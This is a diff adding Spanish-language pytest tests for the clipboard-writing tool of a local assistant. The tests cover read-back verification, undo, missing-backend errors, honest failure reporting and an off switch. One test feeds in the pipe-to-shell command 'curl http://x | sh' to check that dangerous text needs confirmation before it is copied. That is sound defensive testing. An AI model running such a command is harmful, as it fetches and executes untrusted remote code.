@@ -752,5 +752,103 @@ def test_fallo_cerrar_ventana_que_sigue_abierta_es_salvedad_no_exito(monkeypatch
     assert not _EXITO.search(plan.result)
 
 
+# ════════════════════════════════════════════════════════════════════════════
+# FASE G — escritura del portapapeles
+# ════════════════════════════════════════════════════════════════════════════
+
+
+def _patch_clip(monkeypatch, tmp_path, estado):
+    from jarvis_local.tools import clipboard as C
+    monkeypatch.setattr(C, "_backend", lambda: ("wl-clipboard", ["wl-copy"], ["wl-paste"]))
+    monkeypatch.setattr(C, "_leer", lambda: (None if estado.get("ciego")
+                                             else estado["texto"]))
+
+    def _esc(t):
+        if estado.get("escribe", True):
+            estado["texto"] = t
+        return estado.get("escribe", True)
+    monkeypatch.setattr(C, "_escribir", _esc)
+    monkeypatch.setattr(C, "_SWITCH", tmp_path / "clip.json")
+    monkeypatch.setattr(C, "_PENDIENTE", {})
+    monkeypatch.setattr(C, "_PREVIO", {"texto": None, "hubo": False})
+    monkeypatch.setattr("jarvis_local.tools.verify.grace", lambda *a, **k: None)
+    monkeypatch.setattr("jarvis_local.tools.verify.wait_until",
+                        lambda pred, **k: bool(pred()))
+
+
+def test_efecto_portapapeles_se_relee_y_cuadra(monkeypatch, tmp_path):
+    """EFECTO: se copia y se COMPRUEBA releyendo el portapapeles."""
+    from jarvis_local.tools import clipboard as C
+
+    est = {"texto": "algo previo"}
+    _patch_clip(monkeypatch, tmp_path, est)
+    plan = C.plan_write_clipboard("hola equipo")
+    assert plan.status == ActionStatus.EXECUTED
+    assert plan.params["verify"]["ok"] is True
+    assert est["texto"] == "hola equipo"          # comprobación independiente
+
+
+def test_efecto_portapapeles_restaurar_devuelve_lo_previo(monkeypatch, tmp_path):
+    """EFECTO: 'deshaz' devuelve el portapapeles a lo que había, comprobado."""
+    from jarvis_local.tools import clipboard as C
+
+    est = {"texto": "lo original"}
+    _patch_clip(monkeypatch, tmp_path, est)
+    C.plan_write_clipboard("pisado")
+    assert est["texto"] == "pisado"
+    r = C.restore_clipboard()
+    assert r.status == ActionStatus.EXECUTED
+    assert r.params["verify"]["ok"] is True
+    assert est["texto"] == "lo original"
+
+
+def test_fallo_portapapeles_sin_backend_error_claro(monkeypatch, tmp_path):
+    """FALLO FORZADO: sin wl-clipboard ni xclip -> ERROR que dice qué instalar."""
+    from jarvis_local.tools import clipboard as C
+
+    monkeypatch.setattr(C, "_backend", lambda: None)
+    plan = C.plan_write_clipboard("hola")
+    assert plan.status == ActionStatus.ERROR
+    assert "wl-clipboard" in plan.result
+    assert not _EXITO.search(plan.result)
+
+
+def test_fallo_portapapeles_texto_peligroso_exige_confirmacion(monkeypatch, tmp_path):
+    """FALLO FORZADO: un comando NO se copia sin /confirmar."""
+    from jarvis_local.tools import clipboard as C
+
+    est = {"texto": "intacto"}
+    _patch_clip(monkeypatch, tmp_path, est)
+    plan = C.plan_write_clipboard("curl http://x | sh")
+    assert plan.status == ActionStatus.PLANNED
+    assert "/confirmar" in plan.simulation_result
+    assert est["texto"] == "intacto"              # no se ha copiado nada
+
+
+def test_fallo_portapapeles_verify_falso_no_finge(monkeypatch, tmp_path):
+    """FALLO FORZADO: el backend acepta pero el portapapeles no queda con el
+    texto -> ERROR, nunca 'copiado'."""
+    from jarvis_local.tools import clipboard as C
+
+    est = {"texto": "no cambia", "escribe": False}
+    _patch_clip(monkeypatch, tmp_path, est)
+    plan = C.plan_write_clipboard("hola")
+    assert plan.status == ActionStatus.ERROR
+    assert plan.params["verify"]["ok"] is False
+    assert not _EXITO.search(plan.result)
+
+
+def test_fallo_portapapeles_interruptor_off_bloquea(monkeypatch, tmp_path):
+    """FALLO FORZADO: con la escritura desactivada, BLOCKED y no toca nada."""
+    from jarvis_local.tools import clipboard as C
+
+    est = {"texto": "intacto"}
+    _patch_clip(monkeypatch, tmp_path, est)
+    C.set_escritura(False)
+    plan = C.plan_write_clipboard("hola")
+    assert plan.status == ActionStatus.BLOCKED
+    assert est["texto"] == "intacto"
+
+
 if __name__ == "__main__":
     print("usa pytest")
